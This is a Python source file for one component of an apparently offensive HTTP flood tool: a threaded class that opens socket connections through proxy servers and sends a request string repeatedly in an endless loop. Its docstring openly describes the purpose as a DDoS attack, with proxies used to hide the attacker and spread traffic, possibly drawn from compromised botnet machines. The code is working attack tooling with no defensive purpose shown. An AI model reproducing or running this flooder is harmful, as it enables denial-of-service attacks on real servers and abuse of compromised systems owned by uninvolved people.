import threading , socket


# class for proxy http requests  



""" 
The purpose of using a proxy file is to mask the IP addresses of the systems that are sending the requests,
making it more difficult for the target server to identify and block the attack. 
Additionally, using a proxy file allows the attacker to launch the attack from multiple systems at once, 
making it more difficult for the target server to handle the large amount of traffic.
These IP addresses can be of different types such as Residential IP's, Datacenter IP's etc.
Residential IP's are IP addresses assigned to home internet connections,
which are often less likely to be blocked by targeted server's firewall 
The IP addresses in the file are likely to be from systems that have been compromised by other attackers
and are being used without the knowledge or consent of the owners of those systems. 
This is known as "renting a botnet" or "botnet-for-hire" service, it's an illegal practice and it can cause serious harm
to both the owners of the compromised systems and the target of the DDOS attack.
"""
class RequestProxyHTTP(threading.Thread):
    def __init__(self, proxy_ip , proxy_port, request_cf , args, counter, go ,frame_info):
        threading.Thread.__init__(self)
        self.counter = counter
        self.go = go
        self.args = args
        self.frame_info = frame_info
        self.proxy_ip = proxy_ip
        self.proxy_port = proxy_port
        self.request_cf = request_cf

    def run(self):
        self.go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(self.proxy_ip), int(self.proxy_port)))
                s.send(str.encode(self.request_cf))
                print("Request is sent: ", self.counter)
                try:
                    for y in range(50):
                        s.send(str.encode(self.request_cf))
                except:
                    s.close()
                    print(f"Exception in line {self.frame_info.lineno} , {self.__class__.__name__}")
            except:
                print(f"Socket is not created line: {self.frame_info.lineno}, {self.__class__.__name__}")


